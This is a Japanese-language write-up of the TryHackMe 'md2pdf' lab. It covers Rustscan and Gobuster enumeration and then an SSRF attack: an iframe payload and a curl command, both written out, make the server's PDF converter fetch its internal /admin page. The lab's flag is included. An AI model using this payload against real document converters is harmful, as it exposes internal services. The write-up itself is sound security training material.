---
tags: [hacking, box, writeup, tryhackme]
platform: TryHackMe
difficulty: Easy
status: completed
date: 2026-03-27
skills:
  - Rustscan (ポートスキャン)
  - Gobuster (ディレクトリ列挙)
  - SSRF (Server-Side Request Forgery)
  - iframeインジェクション
room: md2pdf
os: Linux (Ubuntu)
---

# md2pdf

**プラットフォーム**: TryHackMe
**難易度**: Easy
**OS**: Linux (Ubuntu)

---

## 攻略フロー概要

```
ポートスキャン (Rustscan) → HTTP(80), HTTP(5000), SSH(22) 発見
  ↓
Gobuster → /admin (403), /convert (405) 発見
  ↓
SSRFペイロード (iframeインジェクション) → localhost:5000/admin にアクセス
  ↓
Flag取得
```

---

## 1. ポートスキャン

**ツール**: Rustscan + Nmap

```bash
rustscan -a 10.144.138.172 --ulimit 5000 -- -sV -sC
```

### 結果

| ポート | 状態 | サービス | バージョン |
|-------|------|---------|-----------|
| 22/tcp | open | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 |
| 80/tcp | open | HTTP | MD2PDF Webアプリ (Flask) |
| 5000/tcp | open | HTTP | MD2PDF Webアプリ (Flask) |

- ポート80: 公開フロントエンド
- ポート5000: 内部API（Flaskのデフォルトポート）

---

## 2. Webアプリ調査

- ポート80にMarkdown入力フォーム (`<textarea name="md">`) があり、「Convert to PDF」ボタンでPDFに変換する機能
- 変換エンドポイント: `POST /convert`
- PDF変換には `wkhtmltopdf` 系のツールを使用していると推測

---

## 3. ディレクトリ列挙

**ツール**: Gobuster

### 結果

| パス | ステータス | サイズ |
|------|-----------|--------|
| /admin | 403 Forbidden | 166 bytes |
| /convert | 405 Method Not Allowed | 178 bytes |

- `/admin` は外部から403だが存在は確認できた
- ポート5000の内部APIにアクセスできれば取得できると推測

---

## 4. SSRF攻撃

### 攻撃手法

MarkdownフィールドにiframeタグをSSRFペイロードとして注入し、サーバー自身に内部の `/admin` ページを取得させる。

### ペイロード

```html
<iframe src="http://localhost:5000/admin" width="1000" height="1000"></iframe>
```

### 実行コマンド

```bash
curl -v -X POST http://10.144.138.172/convert --form-string 'md=<iframe src="http://localhost:5000/admin" width="1000" height="1000"></iframe>' -o ssrf_test.pdf
```

> **注意**: `-F` オプションでは `<` がファイル参照として解釈されるため `--form-string` を使用する

### レスポンス

```
HTTP/1.1 200 OK
Content-Type: application/pdf
Content-Length: 8748
Content-Disposition: inline; filename=ticket.pdf
```

### 攻撃の仕組み

```
攻撃者 → POST /convert (iframeペイロード)
              ↓
         サーバーがPDF変換処理中に
         localhost:5000/admin へ内部リクエスト
              ↓
         /admin の内容がPDFに埋め込まれて返却
              ↓
         攻撃者がFlagを取得
```

---

## 5. Flag

| Flag |
|------|
| `flag{1f4a2b6ffeaf4707c43885d704eaee4b}` |

---

## まとめ・学んだポイント

- **2層構成の罠**: ポート80 (公開) と ポート5000 (内部) を使い分けており、外部からは `/admin` が403でも SSRFで内部からはアクセス可能
- **PDF変換 = SSRF温床**: `wkhtmltopdf` などはHTMLレンダリング時に外部/内部URLに接続するためSSRFに悪用されやすい
- **iframeインジェクション**: MarkdownがHTMLをそのまま通すため `<iframe>` タグが有効
- **curl の `-F` vs `--form-string`**: `-F` では `field=<value` がファイル読み込みとして解釈されるため、文字列を送る場合は `--form-string` を使う
